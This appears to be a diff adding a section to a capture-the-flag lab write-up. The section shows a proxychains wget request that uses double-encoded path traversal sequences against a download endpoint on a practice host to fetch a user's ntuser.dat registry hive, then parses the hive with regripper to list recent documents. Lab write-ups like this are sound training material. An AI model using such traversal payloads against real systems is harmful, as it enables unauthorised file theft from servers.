@@ -681,6 +681,45 @@ GET
 256e%2561%2572%2579%255c%256e%2574%2575%2573%2565%2572%252e%2564%2561%2574 HTTP/1.1
 ```
 
+ntuser.dat
+
+```
+ proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat' -O ntuser.dat
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+--2026-10-31 11:15:39--  http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat
+Resolving gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)... 224.0.0.1
+Connecting to gpz-op26-secure.ghostlink.htb (gpz-op26-secure.ghostlink.htb)|224.0.0.1|:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  gpz-op26-secure.ghostlink.htb:80  ...  OK
+connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 262144 (256K) [application/octet-stream]
+Saving to: ‘ntuser.dat’
+
+ntuser.dat                  100%[===========================================>] 256.00K  1.07MB/s    in 0.2s    
+
+2026-10-31 11:15:39 (1.07 MB/s) - ‘ntuser.dat’ saved [262144/262144]
+
+```
+
+```
+regripper -r ntuser.dat -p recentdocs
+Launching recentdocs v.20200427
+recentdocs v.20200427
+(NTUSER.DAT) Gets contents of user's RecentDocs key
+
+RecentDocs
+**All values printed in MRUList\MRUListEx order.
+Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
+LastWrite Time: 2026-05-13 01:56:02Z
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.zip
+LastWrite Time 2026-05-13 01:56:02Z
+MRUListEx = 0
+  0 = db.zip
+
+
+```
 ---
 ## Foothold
 
